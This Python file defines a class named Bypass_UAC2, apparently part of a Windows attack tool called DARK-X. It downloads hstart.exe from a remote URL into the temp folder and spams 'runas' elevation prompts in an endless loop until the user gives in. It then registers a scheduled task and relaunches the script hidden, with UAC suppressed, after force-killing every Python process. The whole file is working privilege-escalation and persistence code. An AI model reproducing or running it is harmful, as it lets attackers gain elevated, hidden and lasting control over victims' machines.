import requests
import tempfile
from subprocess import Popen,PIPE
import sys, os
class Bypass_UAC2():
	def __init__(self,_):
		self.note = _.note
		self.hstart = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/hstart.exe"
		self.Main()

	def Main(self):
		import win32com.shell.shell as shell
		req = requests.get(self.hstart)
		filename = os.environ['TEMP'] + r"\hstart.exe"

		file = open(filename, "wb")
		file.write(req.content)
		file.close()

		python = os.path.abspath(sys.executable)
		me = os.path.abspath(sys.argv[0])

		if "HstartUAC" not in os.popen('schtasks.exe | findstr HstartUAC').read():
			while True:
				try:
					shell.ShellExecuteEx(lpVerb='runas', lpFile="cmd.exe", lpParameters="/c " + filename + " /regtask")
					break
				except Exception as ex:
					pass
		sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.note], shell=True)
		os.system("taskkill /IM python.exe /F")
